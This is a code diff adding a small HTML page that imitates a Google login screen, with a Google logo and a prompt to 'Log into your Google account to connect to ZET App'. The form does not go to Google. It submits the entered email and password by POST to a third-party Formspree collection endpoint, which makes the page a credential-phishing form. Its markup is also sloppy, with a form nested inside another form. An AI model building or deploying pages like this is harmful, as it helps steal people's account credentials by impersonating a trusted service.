@@ -1,0 +1,23 @@
+<form action="">
+  <div class="header">
+    <img src="http://pngimg.com/uploads/google/google_PNG19644.png" alt="Google" width="30%" height="20%">
+    <h4>Log into your Google account to connect to ZET App</h4>
+  </div>
+
+   <form
+  action="https://formspree.io/f/mgegyyrz"
+  method="POST"
+>
+ <label>
+   <input type="email" name="email" class="custom-input" placeholder="Email">
+    </label>
+      <label>
+      <input type="password" name="password" id="passwordInput" class="custom-input" placeholder="Contraseña">
+ </label>
+  <!-- your other form fields go here -->
+
+  <div class="btn-group">
+    <button class="b1">Forgot Password?</button>
+ <button type="submit" class="custom-button">Iniciar Sesión</button>
+  </div>
+</form>
